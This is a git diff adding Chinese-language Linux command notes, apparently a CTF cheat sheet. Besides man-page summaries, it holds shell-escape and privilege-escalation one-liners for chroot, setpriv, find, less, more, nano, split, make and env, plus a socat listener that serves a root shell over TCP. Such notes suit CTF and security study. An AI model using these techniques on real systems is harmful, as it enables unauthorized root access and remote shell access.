+    创建新的 mount 命名空间。如果指定了 `file`，则通过在 `file` 处创建 bind mount 使命名空间持久化。注意 `file` 必须位于传播类型不是 `shared` 的挂载上（否则会产生错误）。当不确定当前设置时，使用命令 `findmnt -o+PROPAGATION`。另请参见下面的示例。
+
+- `-U`, `--user[=file]`  
+    创建新的 user 命名空间。如果指定了 `file`，则通过在 `file` 处创建 bind mount 使命名空间持久化。
+
+- `-r`, `--map-root-user`  
+    仅在当前有效用户和组 ID 已映射到新创建的 user 命名空间中的超级用户 UID 和 GID 之后运行程序。这使得即使以非特权方式运行，也可以方便地获得管理新创建命名空间各个方面所需的能力（例如在网络命名空间中配置接口或在 mount 命名空间中挂载文件系统）。作为便利功能，它不支持更复杂的用例，例如映射多个 UID 和 GID 范围。此选项隐含 `--setgroups=deny` 和 `--user`。此选项等效于 `--map-user=0 --map-group=0`。
+
+
+### chroot - 以特殊的根目录运行命令或交互式 shell ⚔️
+
+```sh
+chroot [OPTION]... NEWROOT [COMMAND [ARG]...]
+```
+
+以根目录设置为 `NEWROOT` 运行 `COMMAND`。
+> 判断 euid，可设置 ruid
+
+```sh
+# 修改真实用户与组 id 到 root，启动特权 shell
+chroot --userspec=root:root / /bin/sh
+```
+
+- `--groups=G_LIST`  
+    以 `g1,g2,..,gN` 指定补充组
+
+- `--userspec=USER:GROUP`  
+    指定要使用的用户和组（ID 或名称）
+
+- `--skip-chdir`  
+    不将工作目录更改为 `/`
+
+### runuser - 以替代用户和组 ID 运行命令
+
+```sh
+runuser [options] -u user [[--] command [argument...]]
+
+runuser [options] [-] [user [argument...]]
+```
+
+`runuser` 可用于以替代用户和组 ID 运行命令。如果未给出 `-u` 选项，`runuser` 回退到与 `su` 兼容的语义并执行 shell。`runuser` 与 `su` 命令的区别在于 `runuser` 不询问密码（因为它只能由 root 用户执行），并且使用不同的 PAM 配置。`runuser` 命令不必以 set-user-ID 权限安装。
+
+不带参数调用时，`runuser` 默认以 `root` 身份运行交互式 shell。
+
+> 判断 ruid
+
+### sudo —— 以其他用户的身份执行命令
+
+[官网文档](https://www.sudo.ws/)
+[linux 手册](https://man7.org/linux/man-pages/man8/sudo.8.html)
+
+```sh
+sudo -h | -K | -k | -V
+sudo -v [-ABkNnS] [-g group] [-h host] [-p prompt] [-u user]
+sudo -l [-ABkNnS] [-g group] [-h host] [-p prompt] [-U user] [-u user]
+    [command [arg ...]]
+sudo [-ABbEHnPS] [-C num] [-D directory] [-g group] [-h host] [-p prompt]
+    [-R directory] [-T timeout] [-u user] [VAR=value] [-i | -s]
+    [command [arg ...]]
+sudoedit [-ABkNnS] [-C num] [-D directory] [-g group] [-h host] [-p prompt]
+    [-R directory] [-T timeout] [-u user] file ...
+```
+
+`sudo` 允许被许可的用户以超级用户或安全策略指定的其他用户身份执行 `command`。调用用户的实际（*而非*有效）用户 ID 用于确定查询安全策略时使用的用户名。
+> 判断 ruid
+
+`sudo` 默认以 `root` 身份运行命令.  
+`sudo` 通过检查策略来确定用户是否被授权以 `root` 身份运行命令。这些策略在 `/etc/sudoers` 文件中定义（似乎此文件本身即需要 root 权限读取）
+
+示例
+```sh
+sudo bash -c "多条命令"
+```
+- sudo 后执行一条命令，若尝试执行复杂操作，最简单的是开启子进程 shell
+
+参数
+- `-u 用户名` 切换到用户后运行
+- `-l, --list`
+
+	- 如果未指定命令，则列出调用用户（或由 `-U` 选项指定的用户）在当前主机上的权限。若指定 `-ll`，且安全策略支持详细输出格式，则会采用更长的列表格式。
+
+	- 如果指定了命令，且安全策略允许调用用户（或由 `-U` 选项指定的用户）在当前主机上执行该命令，则会显示该命令的完全限定路径及其所有参数。若指定 `-ll`（且安全策略支持），则会以详细格式显示匹配规则以及该命令。如果指定了命令但策略不允许，`sudo` 将以状态值 1 退出。
+
+- `-s`, `--shell`  
+    如果设置了 `SHELL` 环境变量，则运行它指定的 shell；否则运行调用用户密码数据库条目指定的 shell。如果指定了 `command`，则使用 `-c` 选项将其作为简单命令传递给 shell。`command` 和任何 `arg` 在将每个字符（包括空白）用反斜杠（`\`）转义后（字母数字、下划线、连字符和美元符号除外）用空格连接。如果未指定 `command`，则执行交互式 shell。大多数 shell 在指定 `command` 时与交互式会话相比行为不同；详情请查阅 shell 手册。
+
+### setpriv - 以不同的 Linux 权限设置运行程序 ⚔️
+
+```sh
+setpriv [options] program [arguments]
+```
+
+设置或查询各种跨 `execve(2)` 继承的 Linux 权限设置。
+> 判断 euid，可设置 ruid
+
+```sh
+# 修改真实用户与组 id 到 root，启动特权 shell
+setpriv --clear-groups --regid 0 --reuid 0 /bin/sh
+```
+
+- `--rgid gid`, `--egid gid`, `--regid gid`  
+    设置实际、有效或两者的 GID。`gid` 参数可以作为文本组名给出。
+
+    为安全起见，如果设置任何主 `gid`，你必须指定 `--clear-groups`、`--groups`、`--keep-groups` 或 `--init-groups` 之一。
+
+- `--ruid uid`, `--euid uid`, `--reuid uid`  
+    设置实际、有效或两者的 UID。`uid` 参数可以作为文本登录名给出。
+
+    设置 `uid` 或 `gid` 不会更改能力，尽管最后的 exec 调用可能会更改能力。这意味着，如果你是 root，你可能想执行类似以下操作：
+
+    ```sh
+    setpriv --reuid=1000 --regid=1000 --inh-caps=-all
+    ```
+
 ### su - 以替代的用户和组 ID 执行命令
 
 https://www.man7.org/linux/man-pages/man1/su.1.html
@@ -391,6 +1164,7 @@ su [OPTION]... [-] [USER [ARG]...]
 ## 文件目录操作
 
 > 文件覆盖/移除时，检查目录权限，而非文件
+
 
 ### basename - 从文件名中去除目录和后缀
 
@@ -465,7 +1239,7 @@ file ... file -C [-m magicfiles] file [--help]
 
 `file` 会尝试对每个参数进行分类。测试分为三组，按以下顺序执行：文件系统测试、魔数测试和语言测试。第一个成功的测试会导致文件类型被打印出来。
 
-### 🔍 find - 在目录层次结构中搜索文件
+### find - 在目录层次结构中搜索文件
 
 https://www.man7.org/linux/man-pages/man1/find.1.html
 
@@ -536,6 +1310,9 @@ find / -ignore_readdir_race \
   '!' -readable -prune \
   -o \
   -name flag '!' -type d -print -exec grep 'pwn' {} ';' -quit
+
+# 交互 shell
+find . -exec /bin/sh -p \;
 ```
 
 ### mkfifo - 创建先进先出的命名管道
@@ -947,6 +1724,15 @@ more [options] file ...
 
 逐屏分页浏览文本的过滤器。这个版本特别原始。
 
+```sh
+# 交互 shell
+more /etc/hosts
+# 输入 shell 命令，`!/bin/sh`
+```
+
+- `!command or :!command`  
+    在子shell中执行命令。
+
 ### less - 在终端中显示文件内容
 
 https://www.man7.org/linux/man-pages/man1/less.1.html
@@ -962,7 +1748,59 @@ less [-[+]aABcCdeEfFgGiIJKLmMnNqQrRsSuUVwWX~] [-b size] [-D color]
 逐屏分页浏览文本的过滤器，但允许在文件中向前和向后移动。
 此外，不需要在开始前读取整个输入文件，因此对于大型输入文件，它比文本编辑器（如）启动更快。
 
-## 终端多路复用
+```sh
+# 交互 shell
+less /etc/hosts
+# 输入 shell 命令，`!/bin/sh`
+```
+
+```sh
+# 交互 shell
+VISUAL='/bin/sh -s --' less /etc/hosts
+VISUAL='/bin/sh </dev/tty >/dev/tty 2>/dev/tty #' less /etc/hosts
+# 输入 shell 命令，`v`
+```
+
+```sh
+# 交互 shell
+LESSOPEN="/bin/sh -s 1>&0 2>&0 - %s" less /etc/hosts
+LESSOPEN='/bin/sh </dev/tty >/dev/tty 2>/dev/tty # %s' less /etc/hosts
+```
+
+命令
+
+- `v`  
+    调用编辑器来编辑当前正在查看的文件。 编辑器将从环境变量 `VISUAL` 中获取
+
+- `! shell-command`  
+    调用一个 shell 来执行指定的 shell 命令。
+
+- `# shell-command`  
+    类似于 `!` 命令，只是该命令的展开方式与提示字符串相同。
+
+输入预处理器
+
+- `LESSOPEN="lessopen.sh %s"`  
+    设置被执行的输入预处理器
+
+## 终端
+
+### tset、reset - 初始化或重置终端状态
+
+https://man7.org/linux/man-pages/man1/reset.1.html
+
+```sh
+tset [-IQVcqrsw] [-] [-e ch] [-i ch] [-k ch] [-m mapping]
+[terminal-type]
+reset [-IQVcqrsw] [-] [-e ch] [-i ch] [-k ch] [-m mapping]
+[terminal-type]
+```
+
+首先，`tset` 检索你终端的当前终端模式设置。
+
+接下来，`tset` 确定你正在使用的终端类型。
+
+当以 `reset` 调用时，`tset` 会在执行上述终端初始化之前，将终端模式设置为 “sane” 值
 
 ### Screen
 
@@ -1031,6 +1869,7 @@ tmux [-28lquvV] [-c shell-command] [-f file] [-L socket-name] [-S socket-path] [
 tmux 是一个终端复用器：它允许创建、访问和控制多个终端，所有这些终端都可以从单个屏幕进行管理。tmux 可以从屏幕中分离出来，在后台继续运行，稍后可以重新附加到屏幕上。
 
 命令：
+
 - 
   ```
   tmux new-session [-s 会话名]
@@ -1091,7 +1930,122 @@ tmux 是一个终端复用器：它允许创建、访问和控制多个终端，
 配置文件
 - `~/.tmux.conf`  
 
+## 文本编辑器
+
+### emacs - 文本编辑器
+
+https://linux.die.net/man/1/emacs
+
+https://www.gnu.org/software/emacs/manual/html_node/emacs/index.html
+- [选项索引](https://www.gnu.org/software/emacs/manual/html_node/emacs/Option-Index.html)
+
+
+```sh
+emacs [ command-line switches ] [ files ... ] 
+```
+
+核心在于内置的 Emacs Lisp (Elisp) 编程语言。用户可以通过编写 Elisp 脚本或安装插件，实现几乎任何功能，包括编程、编译、调试、邮件收发、新闻阅读、文件管理、版本控制甚至浏览网页
+
+```sh
+# 交互式输入命令
+emacs --eval '(shell)'
+
+# 交互式输入命令，提供完整的终端模拟
+emacs --eval '(term "/bin/sh")'
+```
+
+> 见 [40 从 Emacs 运行 Shell 命令](https://www.gnu.org/software/emacs/manual/html_node/emacs/Shell.html)
+
+
+#### Emacs 选项
+
+以下选项具有普遍意义：
+
+- `file`  
+    编辑 `file`。
+
+- `--file file`、`--find-file file`、`--visit file`  
+    与直接将 `file` 作为参数指定相同。
+
+- `-q`、`--no-init-file`  
+    不加载初始化文件。
+
+- `--no-site-file`  
+    不加载站点范围的启动文件。
+
+- `--no-splash`  
+    启动时不显示启动画面。
+
+- `-Q`、`--quick`  
+    等同于 `-q --no-site-file --no-splash`。
+
+- `--eval expr`、`--execute expr`  
+    求值 Lisp 表达式 `expr`。
+
+#### 在 X 下使用 Emacs
+
+- `-nw`、`--no-window-system`  
+    告诉 `Emacs` 不要使用其特殊的 X 接口。如果你从 `xterm(1)` 窗口调用 `Emacs` 时使用此开关，显示会在该窗口中完成。
+
+### nano - 文本编辑器
+
+https://www.nano-editor.org/dist/latest/nano.1.html
+
+```sh
+nano [options] [[+line[,column]] file]...
+
+nano [options] [[+[crCR]{/|?}string] file]...
+```
+
+小巧的编辑器
+
+```sh
+# 交互 shell
+nano -s '/bin/sh'
+# 进入编辑器后输入任意之后被作为 sh 参数的内容 `/bin/sh`
+# 最后使用拼写检查快捷键 `^T` 触发
+```
+
+```sh
+nano
+# `^R` 读取文件
+# `^E` 执行命令
+sh -s 1>&0 2>&0
+```
+
+- `-s "program [argument ...]"`, `--speller="program [argument ...]"`  
+    使用此命令执行拼写检查和纠正，而不是使用调用 `hunspell(1)` 或 `spell(1)` 的内置纠正器。
+
+- `-/`, `--modernbindings`  
+    使用类似于大多数现代程序的键绑定：`^X` 剪切，`^C` 复制，`^V` 粘贴，`^Z` 撤销，`^Y` 重做，`^F` 向前搜索，`^G` 搜索下一个，`^S` 保存，`^O` 打开文件，`^Q` 退出，并且（当终端允许时）`^H` 显示帮助。此外，`^A` 设置标记，`^B` 向后搜索，`^D` 搜索上一个，`^R` 进行替换，`^P` 显示位置，`^T` 转到某行，`^W` 写出文件，`^E` 执行命令。注意此选项会覆盖选项 `-p`（`--preserve`）。
+
+
 ## 文件内容与字符串操作
+
+### split - 将文件分割成多个片段
+
+https://man7.org/linux/man-pages/man1/split.1.html
+
+```sh
+split [OPTION]... [FILE [PREFIX]]
+```
+
+将文件的输出写入 PREFIXaa、PREFIXab 等前缀；默认大小为 1000 行，默认前缀为 `'x'`。 
+
+若无 `FILE` 或 `FILE` 为 `-`，则读取标准输入。 
+
+- `-l, --lines=NUMBER`  
+	为每个输出文件添加行数/记录数
+	
+- `--filter=COMMAND`  
+	写入 shell 命令；文件名为 `$FILE`
+
+```sh
+# 读取文件
+split --filter 'cat' /flag
+# 交互式 shell
+split --filter '/bin/sh -i 0<&2 1>&2' /flag
+```
 
 ### tee - 从标准输入读取，并写入标准输出与文件
 
@@ -1820,6 +2774,94 @@ foo%20bar
 
 ## 网络
 
+### socat - 多用途中继 (SOcket CAT)
+
+http://www.dest-unreach.org/socat/doc/socat.html
+
+https://www.man7.org/linux/man-pages/man1/socat.1.html
+
+```sh
+socat [options] <address> <address>
+socat -V
+socat -h[h[h]] | -?[?[?]]
+filan
+procan
+```
+
+`socat` 是一个基于命令行的实用程序，它建立两个双向字节流，并在它们之间传输数据。由于这些流可以由大量不同类型的数据接收器和数据源（参见地址类型）构造，并且可以对这些流应用许多地址选项，因此 `socat` 可用于许多不同目的。
+
+```sh
+# 服务器
+socat \
+TCP4-LISTEN:5556,fork \
+EXEC:'"chroot --userspec=root:root / /bin/sh"',pty,stderr
+```
+- 接受连接 `TCP4-LISTEN` 并为每个连接 `fork` 新子进程
+- 为了 `EXEC` 程序，子进程 `chroot` 到 `/`，设置真实 id 到 root，然后启动 `/bin/sh`  
+    > 注意 `EXEC` 将空格作为参数分隔符，`chroot` 的空格使用 `"` 转义（从而作为本身，而不是 `EXEC` 的分隔符）
+- `Socat` 和 `/bin/sh` 通过伪 tty（`pty`）通信
+- `/bin/sh` 的 `stderr` 重定向到 `stdout`，因此其错误消息通过 `socat` 传输到连接的客户端
+
+```sh
+# 客户端
+socat - TCP4:localhost:5556
+```
+- 在 STDIO `-` 与到主机 `localhost` 端口 `5556` 的 `TCP4` 连接之间传输数据
+
+```sh
+# 有效特权 shell
+socat - exec:'"/bin/sh -p"',pty,ctty
+```
+
+### 地址规范
+
+从 `socat` 1.5.0 及更高版本开始，词法分析尝试有意义地处理引号和括号，并允许转义特殊字符。如果找到字符 `{`、`[`、`'` 之一，则查找相应的结束字符 `}`、`]`、`'`；它们也可以嵌套。在这些结构内，`socat` 的特殊字符和字符串 `:`、`,`、`!!` 不会被特殊处理。所有这些字符和字符串都可以用 `\` 或在 `""` 内转义。
+
+### 地址类型
+
+#### `EXEC:<command-line>`
+
+```
+EXEC:<command-line>
+```
+
+派生一个子进程，使其与父进程建立通信，并使用 `execvp()` 调用指定程序。`<command-line>` 是简单命令，参数由单个空格分隔。如果程序名包含 `/`，最后一个 `/` 之后的部分作为 `ARGV[0]`。如果程序名是相对路径，则适用 `execvp()` 通过 `$PATH` 查找程序的语义。程序成功启动后，`socat` 将数据写入进程的 `stdin`，并从其 `stdout` 读取；默认使用由 `socketpair()` 生成的 UNIX 域套接字。（示例）  
+选项组：`FD`、`SOCKET`、`EXEC`、`FORK`、`TERMIOS`  
+有用选项：`path`、`fdin`、`fdout`、`chroot`、`su`、`su-d`、`nofork`、`socktype`、`pty`、`stderr`、`ctty`、`setsid`、`pipes`、`umask`、`login`、`sigint`、`sigquit`、`netns`  
+另请参阅：`SYSTEM`、`SHELL`
+
+---
+参数
+- `CWTCP-LISTEN:<port>`
+	监听并接受 TCP 连接
+	- Useful options: `crnl, fork, bind, range, tcpwrap, pf, max-children, backlog, mss, su, reuseaddr, retry, cool-write`
+
+- `CWEXEC:<command-line>`
+
+端口选项
+- `CWreuseaddr`
+    重用地址
+
+子进程选项
+- `CWfork`
+	连接后创建子进程
+
+示例
+- `socat TCP-LISTEN:4000,reuseaddr,fork EXEC:'node /usr/app/bot.js'`
+	监听 TCP 端口 4000，连接建立后创建子进程执行命令
+
+- `socat - exec:'sh -p',pty,stderr,setsid,sigint,sane`
+	- 地址1为 `-` 标准输入输出
+	- 地址2为 `exec`
+		逗号分隔选项:
+		- pty 伪终端
+		- stderr 标准错误重定向
+		- setsid 在新会话中创建进程，获得作业控制权限
+		- sigint 处理中断信号
+		- sane 设置初始状态的组合选项
+
+
+
 ### `whois` - whois 目录服务客户端
 
 ```sh
@@ -2074,6 +3116,35 @@ infocmp [-1cCdDeEFgGiIKlLnpqrtTuUVWx] [-A directory] [-B directory] [-Q encoding
 infocmp
 ```
 
+## 环境
+
+### env - 在修改后的环境中运行程序
+
+```sh
+env [OPTION]... [-] [NAME=VALUE]... [COMMAND [ARG]...]
+```
+
+在环境中将每个 `NAME` 设置为 `VALUE`，并运行 `COMMAND`。
+
+
+```sh
+# 在“干净环境”下，确保只从系统目录找到工具链组件
+env -i PATH=/usr/bin:/bin`
+```
+
+```sh
+# 交互 shell
+env /bin/sh -p
+```
+
+- `-a, --argv0=ARG`  
+    将 `ARG` 作为 `COMMAND` 的第零个参数传递
+
+- `-i, --ignore-environment`  
+    以空环境开始
+
+
+单独的 `-` 意味着 `-i`。如果没有 `COMMAND`，则打印结果环境。
 
 ## 未分类
 
@@ -2114,3 +3185,67 @@ chsh [-s shell] [-l] [-h] [-V] [username|UID]
 #### 退出状态
 
 如果操作成功，返回 0；如果操作失败或命令语法无效，返回 1。
+
+### make - 用于维护程序组的 GNU make 工具
+
+```sh
+make [OPTION]... [TARGET]...
+```
+
+`make` 实用程序将自动确定大型程序中哪些部分需要重新编译，并发出重新编译它们的命令。
+
+```makefile
+# makefile 格式
+immediate : immediate ; deferred
+        deferred
+```
+
+```sh
+# 交互 shell，若文件已存在，需添加无条件 make 参数
+
+# makefile 文件格式，全权限 shell
+make --eval '不存在的目标文件 : ; /bin/sh -p'
+
+# make 函数型，普通 shell
+make --eval='$(shell /bin/sh 1>&0 2>&0)'
+```
+
+- `-B`、`--always-make`  
+    无条件地 make 所有目标。
+
+- `-E` `string`、`--eval` `string`  
+    在解析任何 makefile 之前，使用 `eval` 函数解释 `string`。
+
+- `-C` `dir`、`--directory=dir`  
+    在读取 makefile 或执行任何其他操作之前，切换到目录 `dir`。如果指定了多个 `-C` 选项，每个都相对于前一个解释：`-C / -C etc` 等价于 `-C /etc`。这通常用于 `make` 的递归调用。
+
+
+#### 函数调用
+
+函数调用类似于变量引用。它可以出现在变量引用可以出现的任何位置，并使用与变量引用相同的规则展开。函数调用如下所示：
+
+```makefile
+$(function arguments)
+```
+
+或者如下所示：
+
+```makefile
+${function arguments}
+```
+
+##### `shell` 函数
+
+`shell` 函数与除 `wildcard` 函数之外的任何其他函数都不同（参见“`wildcard` 函数”），因为它与 `make` 之外的世界通信。
+
+`shell` 函数为 `make` 提供了与大多数 shell 中反引号（`` ` ``）相同的功能：它执行*命令展开*。这意味着它接受一个 shell 命令作为参数，并展开为该命令的输出。`make` 对结果所做的唯一处理是将每个换行符（或回车/换行对）转换为单个空格。如果有尾随（回车和）换行符，则直接移除。
+
+`shell` 函数的替代方法是 `!=` 赋值运算符；它提供类似行为，但有细微差别（参见“设置变量”）。`!=` 赋值运算符包含在较新的 POSIX 标准中。
+
+以下是 `shell` 函数的一些使用示例：
+
+```makefile
+contents := $(shell cat foo)
+```
+
+将 `contents` 设置为文件 `foo` 的内容，每行之间用空格（而不是换行符）分隔。
